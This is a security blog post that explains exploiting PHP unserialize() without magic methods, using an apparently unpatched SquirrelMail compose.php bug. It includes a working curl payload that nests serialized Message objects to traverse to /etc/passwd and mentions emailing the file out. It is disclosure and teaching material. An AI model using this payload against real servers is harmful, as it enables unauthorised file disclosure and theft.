<p>If you read most introductory material on exploiting PHP unserialize() calls,
you find the same basic pattern: find a call to unserialize() that takes user
input, then find an object available that uses a <a href=https://www.php.net/manual/en/language.oop5.magic.php>magic method</a>, instantiate one
of these objects and use it to start calling other code until you can do
something bad.</p>
<p>But what if you find such a call in an application that doesn&rsquo;t have any magic
methods available? The answer, I think, must be obvious to the people who
usually write tutorials on this, as they don&rsquo;t usually spend much time on it. I
recently spent some time exploiting a <a href=https://www.openwall.com/lists/oss-security/2020/06/20/1>SquirrelMail
bug</a> reported by Hanno
Böck, so I thought I&rsquo;d write about it here.</p>
<p>I need to be fair to Hanno here and point out that he did not call the bug unexploitable - he said it was <em>unclear</em> to him if it was feasible - but I had previously found this unserialize call also and given up trying to exploit it, so the &lsquo;unexploitable&rsquo; label comes from past-me! He reported it upstream anyway while I didn&rsquo;t, so apparently he had a better intuition for the danger than I did&mldr;</p>
<h3 id=a-very-brief-summary-of-the-vulnerability>
A very brief summary of the vulnerability
<a class=heading-link href=#a-very-brief-summary-of-the-vulnerability>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h3>
<p>First, in case anyone isn&rsquo;t familiar, a whirlwind tour of PHP unserialize()
vulnerabilities. PHP has a function in its standard library called
<a href=https://www.php.net/manual/en/function.unserialize.php>unserialize()</a>. It
takes a text representation of an object and turns it into a real object in
memory. It&rsquo;s not supposed to be used on user-controlled data, it&rsquo;s more
properly used for caching objects in external caches, etc. though even this use
can be a bit sketchy. You&rsquo;ll note in the documentation a big red warning about this,
though that wasn&rsquo;t always there. You&rsquo;ll also note it has an &lsquo;allowed_classes&rsquo;
parameter that allows you to restrict which kind of objects it can create, that also wasn&rsquo;t
always there, it&rsquo;s new in PHP 7.</p>
<p>The potential vulnerability here is that an attacker who can edit the text that
goes into unserialize(), for example if you store it in a cookie or accept it
as an HTTP parameter, can modify/control the object that gets created - including all of its properties, and the type, assuming allowed_classes isn&rsquo;t used. It turns
out, this can be extremely powerful.</p>
<h3 id=the-usual-attack-path>
The usual attack path
<a class=heading-link href=#the-usual-attack-path>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h3>
<p>The usual way to exploit this, and the way you see in most &lsquo;101&rsquo; tutorials
on this vulnerability, is to find another object that exists in the codebase we
are working with that implements a magic method. A magic method is a method in
PHP that is automatically called when something specific happens to the object,
examples that are probably familiar would be <code>__construct()</code>, which is
automatically called when the object is created, <code>__destruct()</code>, which is called
when the object is destroyed, and <code>__toString()</code>, which is called when the object
is turned into a string.</p>
<p>When exploiting this vulnerability, we can&rsquo;t actually use <code>__construct()</code>, because this isn&rsquo;t called when objects are unserialized - the equivalent method is <code>__wakeup()</code>. So most exploits for this vulnerability make some use of <code>__wakeup()</code> or <code>__destruct()</code>, and use this to chain onto other objects in order to execute a useful payload. For example, let&rsquo;s say we had the following two objects:</p>
<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=font-weight:700>class</span> <span style=font-weight:700>SomeObject</span> {
  <span style=font-weight:700>public</span> <span style=font-weight:700>function</span> __destruct() {
    $this-&gt;child-&gt;cleanup();
  }
}

<span style=font-weight:700>class</span> <span style=font-weight:700>SomeOtherObject</span> {
  <span style=font-weight:700>public</span> <span style=font-weight:700>function</span> cleanup() {
    system($this-&gt;cleanupCommand);
  }
}
</code></pre></div><p>It wouldn&rsquo;t be possible for us to call <code>SomeOtherObject::cleanup()</code> directly, but
we can call <code>__destruct()</code> on <code>SomeObject</code> just by creating one and waiting until
it is destroyed - and since we control <code>$this->child</code>, we can make that a
reference to a <code>SomeOtherObject</code> instance we also create, in which we control the
<code>$cleanupCommand</code> property - so we can execute arbitrary commands. This is a contrived
example, but I hope it illustrates the idea here - usually in real applications
the chain is a bit longer and more involved. People often call the process of
finding these attack paths Property-Oriented Programming, which is a silly
name for a very fun game. You should try it out, it&rsquo;s like hacker
sudoku.</p>
<h3 id=but-there-are-no-magic-methods>
But, there are no magic methods&mldr;
<a class=heading-link href=#but-there-are-no-magic-methods>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h3>
<p>Sometimes however, you find a risky call to <code>unserialize()</code> but there aren&rsquo;t
any magic methods to use, and that is the case in SquirrelMail. If you are a true badass, you do what <a href=https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/>these
folk</a>
did, and find memory corruption bugs in PHP itself that you can access. However, it&rsquo;s very sunny outside at the moment, I am not
that leet, and besides, if I had memory corruption bugs in PHP I&rsquo;m sure I could
find something more lucrative to do with them!</p>
<p>What we shouldn&rsquo;t forget, though, is that it&rsquo;s not like the application stops
executing after we create our object. Whatever it does afterwards is going to
include behaviour that might depend on the type of our object - we essentially
have a really powerful type confusion here, where the code following our
unserialize() call is expecting the object&rsquo;s type to be one thing, but we can
make it whatever we want.</p>
<p>So, the first thing I would look for, is methods that are called on our new
object that have the same name as methods in other objects - if we have for
example the following:</p>
<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$newObject = unserialize($_GET[&#39;pwnme&#39;]);
$newObject-&gt;run();
</code></pre></div><p>It&rsquo;s likely that &lsquo;run&rsquo; is a common method name
in the project, so maybe we can find another <code>->run()</code> method that would be preferable for
us to call instead of the real one. Exploitation would then continue the same
as it does for magic methods, as it&rsquo;s basically the same idea, except the &lsquo;magic&rsquo;
is created by the application rather than by PHP&rsquo;s engine.</p>
<p>Unfortunately, there weren&rsquo;t any instances of this behaviour in SquirrelMail
either, or at least none that I could find (the code in compose.php is actually
quite hard to follow). When exploiting this bug in other
applications I do find that more often than not there is something though, so
you should definitely explore this - dig into the
code following the unserialize and make sure you understand every possible way
that object could be interacted with.</p>

<i class="fa fa-link" aria-hidden=true></i>
</a>
</h3>
<p>Sometimes when life gives us limes, we must try to make lemonade anyway and
hope nobody at the party notices. We don&rsquo;t have any magic methods to use and we
don&rsquo;t really have any other good POP chains available either, so, no lemons.</p>
<p>However, we aren&rsquo;t dying of thirst yet - we still have full control over the properties of
an object. This is a surprising amount of control, and so it&rsquo;s likely that in
some other part of the code, a developer didn&rsquo;t realise we would have this
power, and
we can abuse some other part of the application behaviour to do something fun.</p>
<p>A fairly common way to use this would be to try for an SQL injection - find an
object that has the ability to generate an SQL query, and manipulate the
properties of said object so that it generates an evil one - and since we&rsquo;re
doing this directly, probably we can bypass any sort of input validation the
application does.</p>
<p>However, in this case we are SquirrelMail, and we don&rsquo;t even have a database! Authentication and storage in SquirrelMail is handled by the
mailserver. So for inspiration, let&rsquo;s take a look at the code that deals with our unserialized
object and see what it actually does:</p>
<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>if (!empty($attachments)) {
    $attachments = unserialize($attachments);
    if (!empty($attachments) &amp;&amp; is_array($attachments)) {
        // sanitize the &#34;att_local_name&#34; since it is user-supplied and used to access the file system
        // it must be alpha-numeric and 32 characters long (see the use of GenerateRandomString() below)
        foreach ($attachments as $i =&gt; $attachment) {
            if (empty($attachment-&gt;att_local_name) || strlen($attachment-&gt;att_local_name) !== 32) {
                unset($attachments[$i]);
                continue;
            }
            // probably marginal difference between (ctype_alnum + function_exists) and preg_match
            if (function_exists(&#39;ctype_alnum&#39;)) {
                if (!ctype_alnum($attachment-&gt;att_local_name))
                    unset($attachments[$i]);
            }
            else if (preg_match(&#39;/[^0-9a-zA-Z]/&#39;, $attachment-&gt;att_local_name))
                unset($attachments[$i]);
        }
        if (!empty($attachments))
            $composeMessage-&gt;entities = $attachments;
    }
}
</code></pre></div><p>Helpfully, we have a comment here from the developers &lsquo;sanitize the
att_local_name since it&rsquo;s used to access the file system&rsquo;. So that&rsquo;s a nice
starting point - can we make our <code>att_local_name</code> something dangerous, since the
developers obviously didn&rsquo;t want it to be?</p>
<p>At first glance, you would think no, because in this code, they loop over the
&lsquo;attachments&rsquo; array and remove any objects inside that have unsafe names,
so even if we make a bad one, it will get sanitised. However, because we have a
can-do attitude, let&rsquo;s look at where this <code>->entities</code> property of
<code>$composeMessage</code>, (which gets set to our object at the end of the above snippet if it still contains some &lsquo;safe&rsquo; objects), is actually used:</p>
<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>function writeBody($message, $stream, &amp;$length_raw, $boundary=&#39;&#39;) {
/* Snipped out some boring stuff here */
  $this-&gt;writeBodyPart($message, $stream, $length_raw);

  for ($i=0, $entCount=count($message-&gt;entities);$i&lt;$entCount;$i++) {
    $msg = $this-&gt;writeBody($message-&gt;entities[$i], $stream, $length_raw,
  }
}
</code></pre></div><p><code>writeBodyPart()</code> is too long to reproduce here even snipped, but it&rsquo;s not really
important - the important thing to know is that this is the function that
actually uses
the <code>att_local_name</code> property - it gets the contents of the file and then writes
it to our output stream (basically, wherever the message is being delivered to,
ie. the SMTP connection if we are sending the message, or the IMAP one if we
are putting it in the drafts folder, and so on).</p>
<p>Particularly awake readers will have noticed that this function is recursive -
if <code>$message</code> has an <code>->entities</code> property, <code>writeBody()</code> will be called on all of
the entities there, and if they do, on those too, and so on.</p>
<p>But the validation function above that checked if the filename was safe <em>wasn&rsquo;t
recursive</em> - it only iterated over the array we originally unserialized! The
developer of the <code>writeBody()</code> code didn&rsquo;t assume we would be able to fully
control the properties of a <code>Message</code> object to this degree, but thanks to
our unserialize() vulnerability we can - so we can create a <code>Message</code> that has a filename that is
safe, which contains in its <code>->entities</code> property <em>another</em> <code>Message</code>, whose
<code>att_local_name</code> points to any file we want - and <em>this</em> property will never be
checked, and so a file of our choice will be written to the output stream.</p>
<p>How does exploiting this look? Well, like this:</p>
<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>curl http://mysquirrelmail/src/compose.php --cookie &#39;[mycookieshere]&#39; --data &#39;send=Send&amp;send_to=root&amp;attachments=a:1:{i:0;O:7:&#34;Message&#34;:2:{s:14:&#34;att_local_name&#34;;s:32:&#34;12345678901234567890123456789012&#34;;s:8:&#34;entities&#34;;a:1:{i:0;O:7:&#34;Message&#34;:1:{s:14:&#34;att_local_name&#34;;s:28:&#34;../../../../../../etc/passwd&#34;;}}}};&#39;
</code></pre></div><p>That is a bit unwieldy, so to explain, we pass <code>unserialize()</code> an array, containing a <code>Message</code> object. This <code>Message</code> object has an <code>att_local_name</code> that passes SquirrelMail&rsquo;s validation - it&rsquo;s 32 characters long, and totally alphanumeric. It also has an <code>entities</code> property. This is another array, containing one <code>Message</code> object, but /this/ <code>Message</code> object has an <code>att_local_name</code> that hops up a bunch of directories with .. and then grabs the passwd file. The &lsquo;root&rsquo; destination address isn&rsquo;t required by the way, I just did that because it would deliver on my local IMAP server - you can also save it as a draft and get it from the draft folder, or on a real server, exfiltrate it by sending it to an email address you control.</p>
<p>The result of this exploit looks like this:</p>
<p><img src=/images/squirrelmail-lfd.png alt="Squirrelmail LFD"></p>
<p>Which, I hope you can agree, definitely constitutes a valid attack path. I
wasn&rsquo;t able to find RCE, unfortunately - but as I&rsquo;ve already proven to myself,
it&rsquo;s easy to give up on these vulnerabilities too soon, so maybe one day. :)</p>

<p>AMENDMENT 24 Jul 17:27 UTC: Actually, this bug isn&rsquo;t fixed by Hanno&rsquo;s patch, he notes in the report that it doesn&rsquo;t fix the attachments array, only the others. So, there is currently no patch available for this issue.</p>
<p>This is technically a 0-day, I suppose, since SquirrelMail don&rsquo;t seem to have
taken Hanno&rsquo;s advice on board yet. If you run SquirrelMail, sorry, you should probably
be concerned about it. The proper fix would be to remove the calls to <code>unserialize()</code> and replace them
with something like JSON, which I believe Hanno successfully did in <a href=https://github.com/hannob/squirrelpatches/blob/main/patches/squirrelmail-security-mailto-avoid-unserialize.diff>his patch</a>, but I haven&rsquo;t
tested it myself. Personally, I would suggest that you stop running
SquirrelMail, as they appear to be quite slow to respond to security issues,
and it&rsquo;s sort of unmaintained - CPanel dropped support for it for this reason.</p>
<p>If you have any questions or comments on this blog post I&rsquo;ve love to hear them,
feel free to tweet or mail me! I need to start documenting more stuff, so encouragement via
interaction is neat.</p>
